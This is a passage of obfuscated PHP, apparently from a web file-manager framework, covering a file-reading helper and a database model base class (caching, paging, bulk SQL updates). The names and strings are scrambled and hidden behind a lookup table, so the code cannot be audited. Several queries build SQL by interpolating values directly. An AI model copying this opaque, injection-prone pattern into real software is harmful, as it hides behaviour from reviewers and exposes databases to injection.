$eÇÆšÆÎÄæ * $Fô¦êø¹ß, $d°õ¨Äàœ); if (!$A÷³‘¨‰î) { return !1; } $cªÌ­”¾ÆÁ .= $A÷³‘¨‰î; } goto b¡´‡Ÿ…¼‚; CÑæÃ‘ƒä‘: if ($Eš¾­·—˜ <= $d°õ¨Äàœ * $fœ¤º©™Ö) { return md5($this->fileSubstr($c‚ô›Ñƒ‚­, 0, $Eš¾­·—˜)) . $Eš¾­·—˜; } $eÇÆšÆÎÄæ = intval($Eš¾­·—˜ / $fœ¤º©™Ö); $cªÌ­”¾ÆÁ = $Bñ¯Å­…Ò[33]; goto c ‹ß‘ÖÆÇ; Föï¶¼™Ñ£: $Eš¾­·—˜ = $f½ö‹¶é±[$Bñ¯Å­…Ò[77]]; $d°õ¨Äàœ = 200; $fœ¤º©™Ö = 50; goto CÑæÃ‘ƒä‘; F‰¾ŞĞçî¸: } public function getContent($e…„Ç–º»ä) { return $this->fileSubstr($e…„Ç–º»ä); } public function fileSubstr($b»Â¶Ö™¹, $D˜ÒÑÜÉ‰ò = 0, $CšŒĞË°ÄÓ = -1) { goto Bä±µ…Û„ª; Bä±µ…Û„ª: $dÙ…­œ²Ú¼ =& $_SERVER[Â€Á›¨õ]; $aòëÕ„¬ = $this->info($b»Â¶Ö™¹); if (!$aòëÕ„¬ || !$aòëÕ„¬[$dÙ…­œ²Ú¼[193]] && $aòëÕ„¬[$dÙ…­œ²Ú¼[77]] > 1024 * 1024 * 10) { return !1; } goto a‰¼À‘èª´; a‰¼À‘èª´: if ($CšŒĞË°ÄÓ === -1) { $CšŒĞË°ÄÓ = $aòëÕ„¬[$dÙ…­œ²Ú¼[77]]; } if ($CšŒĞË°ÄÓ == 0) { return $dÙ…­œ²Ú¼[33]; } $EÎÛ¬•¥·Í = array($dÙ…­œ²Ú¼[1353] . $D˜ÒÑÜÉ‰ò . $dÙ…­œ²Ú¼[728] . ($D˜ÒÑÜÉ‰ò + $CšŒĞË°ÄÓ - 1)); goto a¡É‹ğ–À¬; a¡É‹ğ–À¬: $D¿ÉÀĞèò• = url_request($b»Â¶Ö™¹, $dÙ…­œ²Ú¼[226], !1, $EÎÛ¬•¥·Í, !1, !1, 1); return $D¿ÉÀĞèò•[$dÙ…­œ²Ú¼[1062]] ? $D¿ÉÀĞèò•[$dÙ…­œ²Ú¼[1062]] : $dÙ…­œ²Ú¼[33]; goto aÉšÚÌ›„Á; aÉšÚÌ›„Á: } public function download($Eá£‚¯Ñ, $f±î‰Ó¼ÜÂ) { Downloader::start($Eá£‚¯Ñ, $f±î‰Ó¼ÜÂ); return $f±î‰Ó¼ÜÂ; } } goto dŠçÎÁÉâ; A–—ìœÉ«‰: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\x69\x66\x79\x54\151\x6d\145", "\164\151\x6d\145", "\x69\x6e\163\145\x72\164\x2c\x75\160\144\141\x74\145", "\x66\165\x6e\143\x74\151\x6f\x6e"), array("\x63\x72\145\x61\x74\x65\124\151\x6d\145", "\x74\151\155\x65", "\x69\x6e\163\x65\162\164", "\146\x75\156\143\x74\151\x6f\x6e")); public function setDataAuto($B­®Šˆƒ¹ó) { $this->dataAuto = $B­®Šˆƒ¹ó; } public function __construct($AŞæŸ÷§Âº = '', $cÈó“Ä÷«­ = '', $bæ˜—‘±´Ó = '') { parent::__construct($AŞæŸ÷§Âº, $cÈó“Ä÷«­, $bæ˜—‘±´Ó); } public static function textEncode($CèµæÓ‘½¹) { if (!$CèµæÓ‘½¹) { return $CèµæÓ‘½¹; } $D¤ÓĞ¼î‘ç = json_encode($CèµæÓ‘½¹); $D¤ÓĞ¼î‘ç = preg_replace_callback($_SERVER[Â€Á›¨õ][351], function ($b®¾»µØ…») { return addslashes($b®¾»µØ…»[0]); }, $D¤ÓĞ¼î‘ç); return json_decode($D¤ÓĞ¼î‘ç); } public static function textDecode($cëæÄêîéğ) { $Có³š¢’Ò« =& $_SERVER[Â€Á›¨õ]; $AÄŞ¼“ÓÜò = json_encode($cëæÄêîéğ); $AÄŞ¼“ÓÜò = preg_replace_callback($Có³š¢’Ò«[352], function ($A‰ƒÇä’ù) { return $_SERVER[Â€Á›¨õ][96]; }, $AÄŞ¼“ÓÜò); return json_decode($AÄŞ¼“ÓÜò); } protected $tableMeta = array(); protected function _beforeInsert(&$f…åïğÚÒ¡, $b¯¼èñº) { $aëÕ—Ê§˜ =& $_SERVER[Â€Á›¨õ]; if (!$this->checkDataAutoHas($aëÕ—Ê§˜[353])) { return; } $this->dataBeforeFilter($f…åïğÚÒ¡, $aëÕ—Ê§˜[353]); } protected function _beforeUpdate(&$fŒ…¤èĞ´Ç, $Fî¥§Ã¢‚ô) { $E¼áÕš–Ÿ =& $_SERVER[Â€Á›¨õ]; if (!$this->checkDataAutoHas($E¼áÕš–Ÿ[354])) { return; } $this->dataBeforeFilter($fŒ…¤èĞ´Ç, $E¼áÕš–Ÿ[354]); } protected function _afterSelect(&$Båì¨í‹ó—, $D»¦“ê¬ò) { if (!is_array($Båì¨í‹ó—)) { return; } if (!$this->checkDataAutoHas($_SERVER[Â€Á›¨õ][355])) { return; } foreach ($Båì¨í‹ó— as &$cï¦ä±÷ÑÙ) { $this->dataAfterFilter($cï¦ä±÷ÑÙ); } unset($cï¦ä±÷ÑÙ); } protected function _afterFind(&$DŒŒ•ÃÖß, $bó„ˆµ¤Ûñ) { if (!is_array($DŒŒ•ÃÖß)) { return; } if (!$this->checkDataAutoHas($_SERVER[Â€Á›¨õ][355])) { return; } $this->dataAfterFilter($DŒŒ•ÃÖß); } public function setAutoIncrement($E¦Œ÷¢ƒ») { $a­ƒ¢ÏñÍä = array($this->getPk() => $E¦Œ÷¢ƒ»); $aÜÃ†¹Â©ò = $this->data($a­ƒ¢ÏñÍä)->add(); if ($aÜÃ†¹Â©ò) { $this->delete($aÜÃ†¹Â©ò); } } public function getAutoIncrement() { $c×µ¹«“·Ä = $this->getTableName(); $FÅ ÊÔ¯ = $this->max($this->getPk()); $d»ÎÜñÄĞ = $this->query("\163\150\157\x77\x20\x74\x61\142\154\145\40\163\164\141\164\x75\x73\40\x77\x68\145\x72\145\40\116\141\155\x65\75\47{$c×µ¹«“·Ä}\47"); $dÇËµ±‡¿ = $d»ÎÜñÄĞ[0][$_SERVER[Â€Á›¨õ][356]]; $Fæ·óã¨é = max($FÅ ÊÔ¯, $dÇËµ±‡¿); return $Fæ·óã¨é; } protected function _callBefore($e²‰„©íÈ‡, $CİËŠ¦À×) { return $this->cacheCallCheck($e²‰„©íÈ‡, $CİËŠ¦À×, !1); } protected function _callAfter($bÅËÚÈ•ë­, $fƒ³¬Ë¢ë‹) { return $this->cacheCallCheck($bÅËÚÈ•ë­, $fƒ³¬Ë¢ë‹, !0); } protected function cacheFunctionAlias($a†³‹ÜŸƒ±) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($bÃ¶ë™…İ, $dŠÜ°¼ß¨», $A›â‘¢Ş = false) { $BäÈåßÏŠ = $this->cacheFunctionAlias($dŠÜ°¼ß¨»); if (!$BäÈåßÏŠ) { return; } foreach ($BäÈåßÏŠ as $aÙâ‘„”° => $cŠ£Ï‡«) { $A‹¾Ú‡¼«Ë = $cŠ£Ï‡«[0]; $aÖÌî¤ò­ = explode($_SERVER[Â€Á›¨õ][47], $cŠ£Ï‡«[1]); if ($bÃ¶ë™…İ == $aÙâ‘„”°) { return $this->cacheFunctionGet($aÙâ‘„”°, $A‹¾Ú‡¼«Ë); } if ($A›â‘¢Ş && in_array($bÃ¶ë™…İ, $aÖÌî¤ò­)) { $this->cacheFunctionClear($aÙâ‘„”°, $A‹¾Ú‡¼«Ë); } } } public function cacheFunctionGet($dÆÀ¬ƒìØˆ, $c†–ß¤‚öõ) { $b¥ÒÄí§Êë = $this->cacheKeyMake($dÆÀ¬ƒìØˆ, $c†–ß¤‚öõ); $BØ³‚¨¬Øñ = Cache::get($b¥ÒÄí§Êë); if (!is_array($BØ³‚¨¬Øñ)) { $BØ³‚¨¬Øñ = call_user_func_array(array($this, $dÆÀ¬ƒìØˆ), array($c†–ß¤‚öõ, !0)); Cache::set($b¥ÒÄí§Êë, $BØ³‚¨¬Øñ); } return $BØ³‚¨¬Øñ; } public function cacheFunctionClear($Cé©ÆÉ„, $e¶˜Ç÷Ìôá) { $Dö‹óÕÆ†¬ = $e¶˜Ç÷Ìôá; if (!is_array($e¶˜Ç÷Ìôá)) { $Dö‹óÕÆ†¬ = array($e¶˜Ç÷Ìôá); } foreach ($Dö‹óÕÆ†¬ as $BËèõ„îÍ) { $f˜‡²ë½µ÷ = $this->cacheKeyMake($Cé©ÆÉ„, $BËèõ„îÍ); Cache::remove($f˜‡²ë½µ÷); } } private function cacheKeyMake($F÷¡áŠ¼ñÃ, $FÙ·ŒØÁ„ƒ) { $AÄº—‚£È =& $_SERVER[Â€Á›¨õ]; return get_class($this) . $AÄº—‚£È[70] . $F÷¡áŠ¼ñÃ . $AÄº—‚£È[357] . $FÙ·ŒØÁ„ƒ; } protected function selectPageReset() { $EÉ¬îÂ•é =& $_SERVER[Â€Á›¨õ]; if (isset($GLOBALS[$EÉ¬îÂ•é[358]])) { return; } $GLOBALS[$EÉ¬îÂ•é[358]] = isset($GLOBALS[$EÉ¬îÂ•é[7]][$EÉ¬îÂ•é[359]]) ? $GLOBALS[$EÉ¬îÂ•é[7]][$EÉ¬îÂ•é[359]] : !1; $GLOBALS[$EÉ¬îÂ•é[360]] = isset($GLOBALS[$EÉ¬îÂ•é[7]][$EÉ¬îÂ•é[349]]) ? $GLOBALS[$EÉ¬îÂ•é[7]][$EÉ¬îÂ•é[349]] : !1; $GLOBALS[$EÉ¬îÂ•é[7]][$EÉ¬îÂ•é[359]] = !1; $GLOBALS[$EÉ¬îÂ•é[7]][$EÉ¬îÂ•é[349]] = !1; } protected function selectPageRestore() { $bæ¡˜¦ÎÕ =& $_SERVER[Â€Á›¨õ]; if (!isset($GLOBALS[$bæ¡˜¦ÎÕ[358]])) { return; } $GLOBALS[$bæ¡˜¦ÎÕ[7]][$bæ¡˜¦ÎÕ[359]] = $GLOBALS[$bæ¡˜¦ÎÕ[358]]; $GLOBALS[$bæ¡˜¦ÎÕ[7]][$bæ¡˜¦ÎÕ[349]] = $GLOBALS[$bæ¡˜¦ÎÕ[360]]; unset($GLOBALS[$bæ¡˜¦ÎÕ[358]]); unset($GLOBALS[$bæ¡˜¦ÎÕ[360]]); } protected function selectPage($e§¦¹“Ù… = 200, $FÄäóàªò† = 1) { goto d¹ê‰ÂëÃ; Bî²å ³ïÊ: $C…ùĞÌŠ³Ö = $f›èÏÏâ‰í; $C…ùĞÌŠ³Ö[$aœ±³³ÇÂ[361]] = array(); $e§¦¹“Ù… = intval($e§¦¹“Ù…); goto Aò®ÊÒ˜; b’š’ò²•: if (!is_array($då‘¤½¬˜)) { $då‘¤½¬˜ = array(); } if ($d„‰„œµŠ“ == 1) { $A“ïÑ§Ê… = count($då‘¤½¬˜); } $C¦ÜƒÛö¿ = array($aœ±³³ÇÂ[362] => array($aœ±³³ÇÂ[363] => $A“ïÑ§Ê…, $aœ±³³ÇÂ[359] => $e§¦¹“Ù…, $aœ±³³ÇÂ[349] => $FÄäóàªò†, $aœ±³³ÇÂ[364] => $d„‰„œµŠ“), $aœ±³³ÇÂ[365] => $då‘¤½¬˜); goto fÍØî³¥¹; DÙÉµ À¶õ: $då‘¤½¬˜ = array(); $A©éĞ‘¬ó = 1; if ($FÄäóàªò† == 1 && $A©éĞ‘¬ó) { $this->optionsValue($f›èÏÏâ‰í); $då‘¤½¬˜ = $this->page($FÄäóàªò†, $e§¦¹“Ù…)->select(); $A“ïÑ§Ê… = is_array($då‘¤½¬˜) ? count($då‘¤½¬˜) : 0; if ($A“ïÑ§Ê… < $e§¦¹“Ù…) { $d„‰„œµŠ“ = 1; } else { $this->optionsValue($C…ùĞÌŠ³Ö); $A“ïÑ§Ê… = intval($this->count()); $d„‰„œµŠ“ = ceil($A“ïÑ§Ê… / $e§¦¹“Ù…); } } else { $this->optionsValue($C…ùĞÌŠ³Ö); $A“ïÑ§Ê… = intval($this->count()); $d„‰„œµŠ“ = ceil($A“ïÑ§Ê… / $e§¦¹“Ù…); $FÄäóàªò† = $FÄäóàªò† >= $d„‰„œµŠ“ ? $d„‰„œµŠ“ : $FÄäóàªò†; $this->optionsValue($f›èÏÏâ‰í); $då‘¤½¬˜ = $this->page($FÄäóàªò†, $e§¦¹“Ù…)->select(); } goto b’š’ò²•; Aò®ÊÒ˜: $e§¦¹“Ù… = $e§¦¹“Ù… <= 5 ? 5 : ($e§¦¹“Ù… >= $EĞİ‡’ŸÁ ? $EĞİ‡’ŸÁ : $e§¦¹“Ù…); $FÄäóàªò† = intval(isset($in[$aœ±³³ÇÂ[349]]) && $in[$aœ±³³ÇÂ[349]] ? $in[$aœ±³³ÇÂ[349]] : $FÄäóàªò†); $FÄäóàªò† = $FÄäóàªò† <= 1 ? 1 : $FÄäóàªò†; goto DÙÉµ À¶õ; BèÙŒÏ®Â: $EĞİ‡’ŸÁ = 50000; $e§¦¹“Ù… = isset($in[$aœ±³³ÇÂ[359]]) && $in[$aœ±³³ÇÂ[359]] ? $in[$aœ±³³ÇÂ[359]] : $e§¦¹“Ù…; if ($e§¦¹“Ù… === -1) { $in[$aœ±³³ÇÂ[359]] = !1; $EĞİ‡’ŸÁ = 100000000; $e§¦¹“Ù… = $EĞİ‡’ŸÁ; } goto Bî²å ³ïÊ; fÍØî³¥¹: return $C¦ÜƒÛö¿; goto bôºŞÖ˜µ©; d¹ê‰ÂëÃ: $aœ±³³ÇÂ =& $_SERVER[Â€Á›¨õ]; global $in; $f›èÏÏâ‰í = $this->optionsValue(); goto BèÙŒÏ®Â; bôºŞÖ˜µ©: } protected function checkLength($e ¯æ‹¾à, $A´âŠ¾âÀò = 0, $aìŒ¯Í¿ä× = '') { $DÃØ©œ­¦– =& $_SERVER[Â€Á›¨õ]; $A´âŠ¾âÀò = $A´âŠ¾âÀò ? $A´âŠ¾âÀò : 65536; if (!$e ¯æ‹¾à || strlen($e ¯æ‹¾à) < $A´âŠ¾âÀò) { return; } $aìŒ¯Í¿ä× = $aìŒ¯Í¿ä× ? $aìŒ¯Í¿ä× . $DÃØ©œ­¦–[67] : $DÃØ©œ­¦–[33]; show_json($aìŒ¯Í¿ä× . LNG($DÃØ©œ­¦–[366]) . "\x28{$A´âŠ¾âÀò}\x29", !1); } protected function metaSet($F‹×½£¡Á–, $eÖ’Š¶Œ„Ü = null, $Aëé¾¥éÉŠ = null) { goto eÚŠÁ®–ÕÌ; BÉ¦ÂŠÃäÃ: $bÌ‚ÚªÉ¶² = $this->tableMeta[$C˜à›…Æ‹â[368]]; $e†ì·—æí = Model($bÌ‚ÚªÉ¶²); $CğÄ¥£Õè¼ = array($AÖ‚¤°´ => $F‹×½£¡Á–, $C˜à›…Æ‹â[369] => $eÖ’Š¶Œ„Ü); goto fîÀåÙÆ•±; C£„Ñ¡¬®: if (is_string($eÖ’Š¶Œ„Ü)) { $BçÊÌã Ï­[$eÖ’Š¶Œ„Ü] = $Aëé¾¥éÉŠ; } $FŞï²Ÿôî² = array(); foreach ($BçÊÌã Ï­ as $d—À‹î => $fÁ¦–¯¦£õ) { $this->checkLength($fÁ¦–¯¦£õ, !1, $bÌ‚ÚªÉ¶² . $C˜à›…Æ‹â[4] . $d—À‹î); $FŞï²Ÿôî²[] = array($AÖ‚¤°´ => $F‹×½£¡Á–, $C˜à›…Æ‹â[92] => $d—À‹î, $C˜à›…Æ‹â[370] => $fÁ¦–¯¦£õ); } goto D‚Ç‚Õ—Ê; d¨©ßîˆŒ’: CacheLock::unlock($f·Ñ¡ªÈ¼Ñ); return !0; goto E«ºƒÔ›Ç; eÚŠÁ®–ÕÌ: $C˜à›…Æ‹â =& $_SERVER[Â€Á›¨õ]; if (!$this->tableMeta || !$F‹×½£¡Á–) { return !1; } $AÖ‚¤°´ = $this->tableMeta[$C˜à›…Æ‹â[367]]; goto BÉ¦ÂŠÃäÃ; D‚Ç‚Õ—Ê: $f·Ñ¡ªÈ¼Ñ = $C˜à›…Æ‹â[371] . $this->tableMeta; CacheLock::lock($f·Ñ¡ªÈ¼Ñ); $e†ì·—æí->where(array($AÖ‚¤°´ => $F‹×½£¡Á–))->addAll($FŞï²Ÿôî², array(), !0); goto d¨©ßîˆŒ’; fîÀåÙÆ•±: if (is_null($eÖ’Š¶Œ„Ü)) { return $e†ì·—æí->where(array($AÖ‚¤°´ => $F‹×½£¡Á–))->delete(); } if (is_null($Aëé¾¥éÉŠ) && is_string($eÖ’Š¶Œ„Ü)) { return $e†ì·—æí->where($CğÄ¥£Õè¼)->delete(); } $BçÊÌã Ï­ = is_array($eÖ’Š¶Œ„Ü) ? $eÖ’Š¶Œ„Ü : array(); goto C£„Ñ¡¬®; E«ºƒÔ›Ç: } public function metaGet($d¾êğœ·“, $C™£‡’‡Œ¤ = false) { goto Dæ±ÆÃÛ’ª; Dæ±ÆÃÛ’ª: $b²³Ö•õê® =& $_SERVER[Â€Á›¨õ]; if (!$this->tableMeta) { return array(); } $e• ì ‹÷ = $this->tableMeta[$b²³Ö•õê®[367]]; goto aÍÂíå¦•µ; Fß©™ó’‘: $Dƒñ¿…¶¯‰ = $AÅÄ†¤ç˜->field($b²³Ö•õê®[372])->where($a…ÆßãºÈŒ)->select(); $Dƒñ¿…¶¯‰ = array_to_keyvalue($Dƒñ¿…¶¯‰, $b²³Ö•õê®[92], $b²³Ö•õê®[370]); return $Dƒñ¿…¶¯‰; goto EøÄŞÌõ©; aÍÂíå¦•µ: $AÅÄ†¤ç˜ = Model($this->tableMeta[$b²³Ö•õê®[368]]); if ($C™£‡’‡Œ¤) { $a…ÆßãºÈŒ = array($e• ì ‹÷ => $d¾êğœ·“, $b²³Ö•õê®[92] => $C™£‡’‡Œ¤); return $AÅÄ†¤ç˜->where($a…ÆßãºÈŒ)->getField($b²³Ö•õê®[370]); } $a…ÆßãºÈŒ = array($e• ì ‹÷ => $d¾êğœ·“); goto Fß©™ó’‘; EøÄŞÌõ©: } private function checkDataAutoHas($eåœ’´À§ö) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $d¾å×ø”—) { if (in_array($eåœ’´À§ö, explode($_SERVER[Â€Á›¨õ][47], $d¾å×ø”—[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$eŸ–£¼®ÑØ, $D´ÓœáÆ„) { $eˆ‡×Âã¡ =& $_SERVER[Â€Á›¨õ]; foreach ($this->dataAuto as $dğÇ§ùèÒ) { $D¹‹õª‘§† = $dğÇ§ùèÒ[0]; if (!in_array($D´ÓœáÆ„, explode($eˆ‡×Âã¡[47], $dğÇ§ùèÒ[2]))) { continue; } switch (trim($dğÇ§ùèÒ[3])) { case $eˆ‡×Âã¡[317]: case $eˆ‡×Âã¡[318]: $d–§ Ÿ—ê§ = $dğÇ§ùèÒ[1]; $e¸Ÿ¢²®ùÆ = isset($dğÇ§ùèÒ[4]) ? (array) $dğÇ§ùèÒ[4] : array(); if ($d–§ Ÿ—ê§ == $eˆ‡×Âã¡[195] && array_key_exists($D¹‹õª‘§†, $eŸ–£¼®ÑØ)) { if (!$eŸ–£¼®ÑØ[$D¹‹õª‘§†]) { unset($eŸ–£¼®ÑØ[$D¹‹õª‘§†]); } break; } if (isset($eŸ–£¼®ÑØ[$D¹‹õª‘§†])) { array_unshift($e¸Ÿ¢²®ùÆ, $eŸ–£¼®ÑØ[$D¹‹õª‘§†]); } if ($eˆ‡×Âã¡[317] == $dğÇ§ùèÒ[3]) { $eŸ–£¼®ÑØ[$D¹‹õª‘§†] = call_user_func_array($d–§ Ÿ—ê§, $e¸Ÿ¢²®ùÆ); } else { $eŸ–£¼®ÑØ[$D¹‹õª‘§†] = call_user_func_array(array(&$this, $d–§ Ÿ—ê§), $e¸Ÿ¢²®ùÆ); } break; case $eˆ‡×Âã¡[269]: $eŸ–£¼®ÑØ[$D¹‹õª‘§†] = $eŸ–£¼®ÑØ[$dğÇ§ùèÒ[1]]; break; case $eˆ‡×Âã¡[290]: if (isset($eŸ–£¼®ÑØ[$D¹‹õª‘§†]) && !is_string($eŸ–£¼®ÑØ[$D¹‹õª‘§†])) { $eŸ–£¼®ÑØ[$D¹‹õª‘§†] = json_encode_force($eŸ–£¼®ÑØ[$D¹‹õª‘§†]); } break; case $eˆ‡×Âã¡[319]: if ($eŸ–£¼®ÑØ[$D¹‹õª‘§†] === $eˆ‡×Âã¡[33]) { unset($eŸ–£¼®ÑØ[$D¹‹õª‘§†]); } break; case $eˆ‡×Âã¡[320]: $eŸ–£¼®ÑØ[$D¹‹õª‘§†] = $dğÇ§ùèÒ[1]; default: break; } } if ($D´ÓœáÆ„ == $eˆ‡×Âã¡[353]) { $fï„‹›»²ˆ = strtolower($this->db->getDbType()); if (strpos($fï„‹›»²ˆ, $eˆ‡×Âã¡[9]) !== 0) { return; } $DµêÙÑ íä = $this->field(!0)->fields; $fà­Áïœ‹ = $DµêÙÑ íä[$eˆ‡×Âã¡[248]]; if (isset($DµêÙÑ íä[$eˆ‡×Âã¡[247]])) { unset($fà­Áïœ‹[$DµêÙÑ íä[$eˆ‡×Âã¡[247]]]); } foreach ($fà­Áïœ‹ as $Fê³¯¶˜Ï” => $D´ÓœáÆ„) { if (!isset($eŸ–£¼®ÑØ[$Fê³¯¶˜Ï”])) { $eŸ–£¼®ÑØ[$Fê³¯¶˜Ï”] = $eˆ‡×Âã¡[33]; } } } } private function dataAfterFilter(&$eõ„Şº™„¯) { $BŸÑø§—Ó =& $_SERVER[Â€Á›¨õ]; foreach ($this->dataAuto as $A’‚Òèğ‰) { $FæÍÇô‚¶… = $A’‚Òèğ‰[0]; if (!in_array($BŸÑø§—Ó[355], explode($BŸÑø§—Ó[47], $A’‚Òèğ‰[2]))) { continue; } if (!isset($eõ„Şº™„¯[$FæÍÇô‚¶…])) { continue; } switch (trim($A’‚Òèğ‰[3])) { case $BŸÑø§—Ó[317]: case $BŸÑø§—Ó[318]: $eº•ê¤Åá = isset($A’‚Òèğ‰[4]) ? (array) $A’‚Òèğ‰[4] : array(); array_unshift($eº•ê¤Åá, $eõ„Şº™„¯[$FæÍÇô‚¶…]); if ($BŸÑø§—Ó[317] == $A’‚Òèğ‰[3]) { $eõ„Şº™„¯[$FæÍÇô‚¶…] = call_user_func_array($A’‚Òèğ‰[1], $eº•ê¤Åá); } else { $eõ„Şº™„¯[$FæÍÇô‚¶…] = call_user_func_array(array(&$this, $A’‚Òèğ‰[1]), $eº•ê¤Åá); } break; case $BŸÑø§—Ó[269]: $eõ„Şº™„¯[$FæÍÇô‚¶…] = $eõ„Şº™„¯[$A’‚Òèğ‰[1]]; break; case $BŸÑø§—Ó[290]: $A¢·ã©Áš¬ = $eõ„Şº™„¯[$FæÍÇô‚¶…]; $eõ„Şº™„¯[$FæÍÇô‚¶…] = json_decode($A¢·ã©Áš¬, !0); if (is_null($eõ„Şº™„¯[$FæÍÇô‚¶…])) { $eõ„Şº™„¯[$FæÍÇô‚¶…] = $A¢·ã©Áš¬; } break; case $BŸÑø§—Ó[319]: if ($eõ„Şº™„¯[$FæÍÇô‚¶…] === $BŸÑø§—Ó[33]) { unset($eõ„Şº™„¯[$FæÍÇô‚¶…]); } break; case $BŸÑø§—Ó[320]: $eõ„Şº™„¯[$FæÍÇô‚¶…] = $A’‚Òèğ‰[1]; default: break; } } } public function saveAll($dæ°Àôãì§) { goto c–­†¿¯é¨; FÆ“…Ÿ‚±ç: $BÄ–‡Ô£ğ = array(); $Dè•´ÜÖô = count($dæ°Àôãì§); for ($c–ÕÀ»ÏÆµ = 0; $c–ÕÀ»ÏÆµ < $Dè•´ÜÖô; $c–ÕÀ»ÏÆµ++) { $fÏêù–àì° = $dæ°Àôãì§[$c–ÕÀ»ÏÆµ]; if (!is_array($fÏêù–àì°) || count($fÏêù–àì°) != 4) { continue; } $a†¦‘¶¨Âµ = "\125\120\104\x41\124\105\40\x60{$FŒâ¤ì’¡}\x60\x20\x53\105\124\x20{$fÏêù–àì°[2]}\40\75\x20\x43\x41\x53\105\40{$fÏêù–àì°[0]}\x20\xa"; if ($E«ÆÅáŸÚ == 0) { $D¿Û¢ÁˆÌÚ = $a†¦‘¶¨Âµ; } $BÄ–‡Ô£ğ[] = $CÑîŒ†âÍÅ[115] . $fÏêù–àì°[1] . $CÑîŒ†âÍÅ[115]; $E«ÆÅáŸÚ++; $D¿Û¢ÁˆÌÚ .= "\x20\x57\110\105\116\40\x27{$fÏêù–àì°[1]}\x27\40\124\110\x45\116\40\47{$fÏêù–àì°[3]}\x27\40\xa"; if ($E«ÆÅáŸÚ == $dÙ¿½«µ¶§ || $c–ÕÀ»ÏÆµ == $Dè•´ÜÖô - 1) { goto a²‰¨ÈŸ÷ß; B÷³„ìÌÜ÷: $E«ÆÅáŸÚ = 0; $D¿Û¢ÁˆÌÚ = $a†¦‘¶¨Âµ; $this->chunkEventCheck(count($BÄ–‡Ô£ğ)); goto a’Ì”èƒÇ¶; a²‰¨ÈŸ÷ß: $d‘ò¹ğŠĞ = implode($CÑîŒ†âÍÅ[47], $BÄ–‡Ô£ğ); $D¿Û¢ÁˆÌÚ .= "\40\x45\116\x44\x20\40\x57\x48\x45\x52\105\40{$fÏêù–àì°[0]}\40\111\x4e\40\50{$d‘ò¹ğŠĞ}\51\40"; $this->execute($D¿Û¢ÁˆÌÚ); goto B÷³„ìÌÜ÷; a’Ì”èƒÇ¶: $BÄ–‡Ô£ğ = array(); goto Eº–„·õæâ; Eº–„·õæâ: } } goto A¼ñƒğìì¢; c–­†¿¯é¨: $CÑîŒ†âÍÅ =& $_SERVER[Â€Á›¨õ]; $FŒâ¤ì’¡ = $this->tablePrefix . $this->tableName; $dÙ¿½«µ¶§ = self::SQL_WHERE_IN_CHUNK; goto DÕîåÛ¦´Ÿ; A¼ñƒğìì¢: $this->chunkEventSet(); goto a¥æÆáâç”; DÕîåÛ¦´Ÿ: $dæ°Àôãì§ = is_array($dæ°Àôãì§) ? $dæ°Àôãì§ : array(); $D¿Û¢ÁˆÌÚ = $CÑîŒ†âÍÅ[373]; $E«ÆÅáŸÚ = 0; goto FÆ“…Ÿ‚±ç; a¥æÆáâç”: } public function saveAllEach($cŸÉ™—ĞÄ) { $Dº¡ìÛöÊÓ =& $_SERVER[Â€Á›¨õ]; $e‚óÓ¦¯Øê = $this->tablePrefix . $this->tableName; foreach ($cŸÉ™—ĞÄ as $d’í«Ç˜å) { if (!is_array($d’í«Ç˜å) || count($d’í«Ç˜å) != 4) { continue; } $d²ÖÙÇƒÚœ = $d’í«Ç˜å[0] . $Dº¡ìÛöÊÓ[374] . $d’í«Ç˜å[1] . $Dº¡ìÛöÊÓ[115]; $cØ˜Ø‰á˜¯ = $d’í«Ç˜å[2] . $Dº¡ìÛöÊÓ[374] . $d’í«Ç˜å[3] . $Dº¡ìÛöÊÓ[115]; $eñŒ÷ Åá‹ = "\165\x70\144\x61\164\145\x20{$e‚óÓ¦¯Øê}\40\163\145\164\40{$cØ˜Ø‰á˜¯}\x20\x77\x68\145\x72\x65\40{$d²ÖÙÇƒÚœ}\x3b"; $this->execute($eñŒ÷ Åá‹); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($cº¹ä†Šš = false, $EŸƒË÷Ö“¶ = false) { $this->_chunkEvent = $cº¹ä†Šš; $this->_chunkEventParam = $EŸƒË÷Ö“¶; } private function chunkEventCheck($Cµù†áĞ¢Ÿ) { if (!$this->_chunkEvent) { return; } $FÁ­À—’” = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $FÁ­À—’”[$_SERVER[Â€Á›¨õ][375]] = $Cµù†áĞ¢Ÿ; Hook::trigger($this->_chunkEvent, $FÁ­À—’”); } public function addAll($fµÌµ£¼É¯, $AÔÀ„³ = array(), $AÍèïÆªç´ = false) { goto b‚éÖ‹Ò„°; b¹È¨ÚöÆÚ: if (method_exists($this->db, $bÃÓîŸÑ«[268])) { for ($B’÷ÍÃöø” = 0; $B’÷ÍÃöø” < count($fµÌµ£¼É¯); $B’÷ÍÃöø” += $a¬ëØ¯ÏÒ) { $AçÈ…®š‚Å = array_slice($fµÌµ£¼É¯, $B’÷ÍÃöø”, $a¬ëØ¯ÏÒ); if (!is_array($AçÈ…®š‚Å) || count($AçÈ…®š‚Å) == 0) { break; } $BØœÔø³“ì = $this->db->insertAll($AçÈ…®š‚Å, $AÔÀ„³, $AÍèïÆªç´); $this->chunkEventCheck(count($AçÈ…®š‚Å)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($fµÌµ£¼É¯ as $BºÊ×ù‡Ÿ => $Dœ‚‡˜æ´) { $BØœÔø³“ì = $this->db->insert($Dœ‚‡˜æ´, $AÔÀ„³, $AÍèïÆªç´); } $this->commit(); } if (!1 !== $BØœÔø³“ì) { $b‹»¼µ†š» = $this->getLastInsID(); if ($b‹»¼µ†š») { return $b‹»¼µ†š»; } } return $BØœÔø³“ì; goto BåÌ»‰±Ü×; d¶ßšØ¬ˆ¶: if (empty($fµÌµ£¼É¯)) { $this->error = think_lang($bÃÓîŸÑ«[267]); return !1; } $AÔÀ„³ = $this->_parseOptions($AÔÀ„³); foreach ($fµÌµ£¼É¯ as $BºÊ×ù‡Ÿ => $Dœ‚‡˜æ´) { $fµÌµ£¼É¯[$BºÊ×ù‡Ÿ] = $this->_facade($Dœ‚‡˜æ´); $this->_beforeInsert($fµÌµ£¼É¯[$BºÊ×ù‡Ÿ], $AÔÀ„³); } goto b¹È¨ÚöÆÚ; 